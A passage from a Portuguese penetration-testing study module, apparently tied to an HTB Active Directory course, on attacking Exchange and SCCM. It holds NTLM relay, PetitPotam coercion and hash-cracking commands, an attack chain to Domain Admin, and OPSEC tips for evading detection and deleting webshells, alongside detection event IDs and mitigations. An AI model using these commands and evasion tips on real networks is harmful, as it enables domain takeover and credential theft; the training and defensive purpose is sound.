hashcat -m 5600 captured.txt rockyou.txt               # Crack NTLMv2

# === SITE TAKEOVER (NTLM RELAY → MSSQL) ===
python3 ntlmrelayx.py -t "mssql://MSSQL_IP" -smb2support -socks
python3 PetitPotam.py -u user -p pass -d domain ATTACKER_IP SCCM_PRIMARY_IP
proxychains4 -q python3 mssqlclient.py 'DOMAIN/SCCM01$@MSSQL_IP' -windows-auth -no-pass
# Modificar RBAC_Admins e RBAC_ExtendedPermissions em CM_* database
```

#### Ferramentas SCCM

| Ferramenta | Tipo | Uso Principal |
|------------|------|---------------|
| sccmhunter | Python3 | Enumeração LDAP, SMB, DPAPI, HTTP, fake enrollment |
| SharpSCCM | C# | Enumeração, coerção Client Push, lateral movement |
| PXEThief | Python (Windows) | Captura credenciais via PXE boot |
| ligolo-ng | Go | Tunneling para sub-redes internas |
| ntlmrelayx | Python3 (Impacket) | Relay NTLM para MSSQL/SMB |
| PetitPotam | Python3 | Coerção de autenticação NTLM |
| SpoolSample | C# | Coerção via Print Spooler (alternativa) |
| Inveigh | C# | Captura NTLM (alternativa ao Responder em Windows) |
| hashcat | C | Crackear hashes (mode 19850 para PXE, 5600 para NTLMv2) |
| addcomputer.py | Python3 (Impacket) | Criar contas de máquina para fake enrollment |

---

## Detecção e OPSEC

### Exchange — Detecção

**ProxyShell:**
- Logs IIS: requisições para `/autodiscover/autodiscover.json` com email no path
- Arquivo `.aspx` inesperado em `C:\inetpub\wwwroot\aspnet_client\`
- YARA rule: `expl_proxyshell.yar` (disponível no GitHub)
- Event ID 4688 com `w3wp.exe` criando processos filhos

**Password Spray:**
- Event ID 4625 (failed logon) em volume anormal
- Event ID 4776 (NTLM auth failure) para spray via OWA
- Múltiplas falhas de autenticação de IPs externos em curto período

**Hash Theft via Email:**
- Responder/Inveigh logs do lado do atacante
- Tráfego SMB de clientes de email para IPs externos ou inesperados
- Event ID 3 (Sysmon) — conexão de rede de `outlook.exe` para IP não-corporativo

**OPSEC para Exchange:**
```bash
# Usar rate limiting no spray (1 tentativa por usuário por hora)
# Preferir EWS sobre OWA (menos logging)
# ProxyShell: deletar webshell imediatamente após uso
# ntlm_theft: usar formato .htm ou .url (menos suspeitos que .exe)
# Evitar attachments — preferir links ou HTML embutido
```

### SCCM — Detecção

**PXE Attack:**
- Tráfego TFTP (UDP 69) de máquinas não autorizadas
- Requisições DHCP/PXE de MACs desconhecidos
- Logs do Distribution Point: boot requests de clientes desconhecidos

**NAA via DPAPI:**
- Event ID 4688: acesso remoto ao WMI namespace `root\ccm\policy`
- Acesso ao arquivo `C:\Windows\System32\wbem\Repository\OBJECTS.DATA` por processo não esperado
- Credenciais coletadas aparecendo em autenticações suspeitas

**Fake Machine Enrollment:**
- Event ID 4741 (conta de máquina criada) seguido de comunicação HTTP com Management Point
- Conta de máquina nunca usada para autenticação real de máquina
- Múltiplas contas de máquina criadas pelo mesmo usuário em curto período

**Client Push Coercion:**
- Event ID 4648 no servidor SCCM (logon explícito para IP não esperado)
- Tráfego SMB do servidor SCCM para IPs internos incomuns

**NTLM Relay ao MSSQL:**
- Event ID 4624 com `NtlmSsp` no servidor MSSQL de origem inesperada
- Modificações nas tabelas `RBAC_Admins` e `RBAC_ExtendedPermissions` do banco `CM_*`
- Alert no SCCM: novo administrador adicionado

**OPSEC para SCCM:**
```bash
# Preferir fake enrollment → menos ruidoso que DPAPI com admin
# PXE: realizar em horários de menor monitoramento
# NTLM relay: relay é mais discreto que crackear senhas (sem tráfego de wordlist)
# Após obter NAA credentials: testar em DC antes de usar para movimentação
# Limpar addcomputer.py após extração: deletar conta de máquina criada
# Site Takeover: restaurar RBAC após uso para reduzir janela de detecção

# Verificar se SCCM tem Enhanced HTTP habilitado antes de tentar fake enrollment
python3 sccmhunter.py find ... # Verificar output para "EnhancedHTTP"
```

### Mitigações Defensivas

**Exchange:**
- Aplicar todos os patches (ProxyShell, ProxyLogon, ProxyRelay)
- Bloquear tráfego SMB de saída (porta 445) nos servidores de email
- Desabilitar NTLM em OWA/EWS (usar Kerberos/Modern Auth)
- MFA para todos os acessos ao Exchange
- Monitorar `/aspnet_client/` por novos arquivos .aspx

**SCCM:**
- Aplicar patch KB15599094 (mitigação Client Push)
- Configurar HTTPS com PKI para todo tráfego SCCM
- Enhanced HTTP (certifica comunicações mesmo sem PKI completa)
- Restringir Machine Account Quota (padrão 10 → reduzir para 0)
- Proteger PXE com senha obrigatória
- Remover NAA e usar alternativas (HTTPS, Azure AD Join)
- Monitorar modificações no banco MSSQL (tabelas RBAC_*)
- Separar conta de máquina do Primary Server de admin local no MSSQL

---

## Módulos Relacionados

`02_mssql_lateral_movement_e_rce.md` cobre acesso ao banco MSSQL do SCCM via Linked Server — modificando `RBAC_Admins` diretamente para takeover sem PetitPotam. `../09_active_directory/02_kerberoasting_e_asrep.md` recebe a lista de usuários extraída via GAL do Exchange para Kerberoasting direcionado de contas de serviço com SPN. `../08_movimentacao_lateral/05_ntlm_relay_attacks.md` é o destino de hashes NTLMv2 capturados via `ntlm_theft` em emails do Exchange.

### Cadeia de Ataque Típica

```
Reconhecimento Externo
    ↓
Exchange Enumeration (versão, endpoints NTLM)
    ↓
Username Generation (username-anarchy) → GAL Extraction (emailextract.py)
    ↓
Password Spray (Ruler/MailSniper) → Credenciais Válidas
    ↓
[Caminho A] ProxyShell/ProxyLogon → RCE como SYSTEM no Exchange
    ↓
[Caminho B] Phishing Interno → Shell em endpoint da vítima
    ↓
Acesso Interno → Descoberta SCCM (sccmhunter find + smb)
    ↓
[Caminho C] Fake Enrollment → NAA Credentials → Acesso a todos endpoints
    ↓
[Caminho D] NTLM Relay → SCCM MSSQL → Admin SCCM → RCE em toda frota
    ↓
Domain Admin
```

### Ferramentas por Fase

| Fase | Exchange | SCCM |
|------|----------|------|
| Reconhecimento | ntlmscan, nmap ntlm-info | sccmhunter find |
| Enumeração | emailextract.py, MailSniper GAL | sccmhunter smb, SharpSCCM |
| Credenciais | Ruler, MailSniper spray | PXEThief, sccmhunter dpapi/http |
| Exploração | Proxyshell-Exchange, msfconsole | SharpSCCM client-push, ntlmrelayx |
| Pós-exploração | ntlm_theft, msfvenom HTML | sccmhunter, SharpSCCM exec |
| Persistência | Outlook Rules | SCCM Application Deploy |

## Leitura Complementar

- **ProxyShell writeup**: https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange.html
- **PXEThief**: https://github.com/MWR-CyberSec/PXEThief
- **sccmhunter**: https://github.com/garrettfoster13/sccmhunter
- **SharpSCCM**: https://github.com/Mayyhem/SharpSCCM
- **MailSniper**: https://github.com/dafthack/MailSniper
- **Ruler**: https://github.com/sensepost/ruler
- **ntlm_theft**: https://github.com/Greenwolf/ntlm_theft
- **configmgr hashcat module**: https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module
- **ligolo-ng**: https://github.com/nicocha30/ligolo-ng
- **HTB Academy - Active Directory Penetration Tester Path**: Módulo MSSQL, Exchange e SCCM Attacks
